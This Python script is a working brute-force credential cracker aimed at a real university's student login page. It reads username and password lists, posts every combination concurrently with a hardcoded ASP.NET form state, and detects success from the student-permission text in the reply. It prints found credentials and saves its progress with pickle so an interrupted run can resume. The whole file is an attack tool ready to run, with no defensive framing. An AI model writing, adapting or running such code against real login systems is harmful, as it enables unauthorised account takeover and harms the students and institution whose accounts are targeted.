#!/usr/bin/env python
# -*- encoding: utf-8 -*-


import requests
import asyncio
from concurrent.futures import ThreadPoolExecutor
import pickle
from functools import partial
import os


class Hack:

    def __init__(self, usernames: list, passwords: list, max_worker=16):
        self._usernames = usernames
        self._progress = [0] * len(usernames)
        self._passwords = passwords
        self._total = len(usernames) * len(passwords)
        self._count = 0
        self._closing = False
        self._founded = dict()
        self._max_worker = max_worker
        self._loop = None  # asyncio.get_event_loop()
        self._executor = None  # ThreadPoolExecutor(max_workers=max_worker)

    async def _crack_user(self, index):
        start = self._progress[index]
        username = self._usernames[index]
        for i in range(start, len(self._passwords)):
            if self._closing:
                return
            password = self._passwords[i]
            if await self.test(username, password):
                self._founded[username] = password
                self._progress[index] = len(self._passwords)
                self._recalculate_count()
                self._report_status()
                self.on_found(username, password)
                return
            self._progress[index] += 1
            self._count += 1
            self._report_status()

    def _recalculate_count(self):
        self._count = sum(self._progress)

    def _report_status(self):
        progress = self._count * 100 / self._total
        print("\rProgress: %.2f %%, (%d / %d)" % (progress, self._count, self._total), end='')

    def start(self, save_to=None):
        if not self._usernames or not self._passwords:
            return
        self._loop = asyncio.get_event_loop()
        self._executor = ThreadPoolExecutor(max_workers=self._max_worker)
        futures = []
        for i in range(len(self._usernames)):
            futures.append(asyncio.ensure_future(self._crack_user(i)))
        tasks = asyncio.gather(*futures)
        try:
            self._loop.run_until_complete(tasks)
        except KeyboardInterrupt:
            print('\nKeyboard interrupted, try gracefully shutdown, please wait...')
            self._closing = True
            self._loop.run_until_complete(tasks)
        finally:
            self._loop.close()
            self._loop = None
            self._executor = None
            if self._closing and save_to is not None:
                self._closing = False
                with open(save_to, 'wb') as f:
                    self.save(f)
                print('saved to {}'.format(save_to))

    async def test(username, password):
        raise NotImplemented

    def on_found(self, username, password):
        raise NotImplemented

    def save(self, f):
        pickle.dump(self, f)

    @classmethod
    def load(cls, f):
        ins = pickle.load(f)
        if not isinstance(ins, cls):
            raise RuntimeError('Loaded object is not Hackable')
        return ins


class ReatSoftHack(Hack):

    POST_PARAM = {
        "__VIEWSTATE": "dDwtMTU2MDM2OTk5Nzt0PDtsPGk8MT47PjtsPHQ8O2w8aTwzPjtpPDEzPjs+O2w8dDw7bDxpPDE+O2k8Mz47aTw1PjtpPDc+O2k8OT47aTwxMT47aTwxMz47aTwxNT47aTwxNz47PjtsPHQ8cDxwPGw8QmFja0ltYWdlVXJsOz47bDxodHRwOi8vd3d3Lnljancuemp1dC5lZHUuY24vL2ltYWdlcy9iZy5naWY7Pj47Pjs7Pjt0PHA8cDxsPEJhY2tJbWFnZVVybDs+O2w8aHR0cDovL3d3dy55Y2p3LnpqdXQuZWR1LmNuLy9pbWFnZXMvYmcxLmdpZjs+Pjs+Ozs+O3Q8cDxwPGw8QmFja0ltYWdlVXJsOz47bDxodHRwOi8vd3d3Lnljancuemp1dC5lZHUuY24vL2ltYWdlcy9iZzEuZ2lmOz4+Oz47Oz47dDxwPHA8bDxCYWNrSW1hZ2VVcmw7PjtsPGh0dHA6Ly93d3cueWNqdy56anV0LmVkdS5jbi8vaW1hZ2VzL2JnMS5naWY7Pj47Pjs7Pjt0PHA8cDxsPEJhY2tJbWFnZVVybDs+O2w8aHR0cDovL3d3dy55Y2p3LnpqdXQuZWR1LmNuLy9pbWFnZXMvYmcxLmdpZjs+Pjs+Ozs+O3Q8cDxwPGw8QmFja0ltYWdlVXJsOz47bDxodHRwOi8vd3d3Lnljancuemp1dC5lZHUuY24vL2ltYWdlcy9iZzEuZ2lmOz4+Oz47Oz47dDxwPHA8bDxCYWNrSW1hZ2VVcmw7PjtsPGh0dHA6Ly93d3cueWNqdy56anV0LmVkdS5jbi8vaW1hZ2VzL2JnMS5naWY7Pj47Pjs7Pjt0PHA8cDxsPEJhY2tJbWFnZVVybDs+O2w8aHR0cDovL3d3dy55Y2p3LnpqdXQuZWR1LmNuLy9pbWFnZXMvYmcxLmdpZjs+Pjs+Ozs+O3Q8cDxwPGw8QmFja0ltYWdlVXJsOz47bDxodHRwOi8vd3d3Lnljancuemp1dC5lZHUuY24vL2ltYWdlcy9iZzEuZ2lmOz4+Oz47Oz47Pj47dDx0PDt0PGk8Mz47QDwtLeeUqOaIt+exu+Weiy0tO+aVmeW4iDvlrabnlJ87PjtAPC0t55So5oi357G75Z6LLS075pWZ5biIO+WtpueUnzs+PjtsPGk8Mj47Pj47Oz47Pj47Pj47bDxJbWdfREw7Pj7R/HqOM3/HB4sDvzwvPi6m+iKfoA==",
        "Img_DL.x": 26,
        "Img_DL.y": 4,
        "__EVENTTARGET": "",
        "__EVENTARGUMENT": ""
    }

    def __init__(self, usernames, passwords, max_worker=16):
        super(ReatSoftHack, self).__init__(usernames, passwords, max_worker)

    async def test(self, username, password):
        form = self.POST_PARAM.copy()
        form.update(Txt_UserName=username, Txt_Password=password)
        flag = False
        while not flag:
            try:
                result = await self._loop.run_in_executor(self._executor, partial(requests.post,
                                                                                  'http://www.ycjw.zjut.edu.cn//logon.aspx', data=form))
                if result.status_code == 200:
                    flag = True
            except Exception:
                pass


        if "权限:学生" in result.content.decode('gbk'):
            return True
        return False

    def on_found(self, username, password):
        print(f'\rFound: {username} -> {password}')


def load_lines(path):
    with open(path) as f:
        lines = f.read().splitlines()
    return lines


def main():
    SAVED_PATH = 'save.obj'
    if os.path.isfile(SAVED_PATH):
        with open(SAVED_PATH, 'rb') as f:
            hack = ReatSoftHack.load(f)
            print('Loaded from %s' % SAVED_PATH)
    else:
        usernames = load_lines('usernames.txt')
        passwords = load_lines('passwords.txt')
        hack = ReatSoftHack(usernames, passwords, max_worker=16)
    hack.start(save_to=SAVED_PATH)

if __name__ == '__main__':
    main()
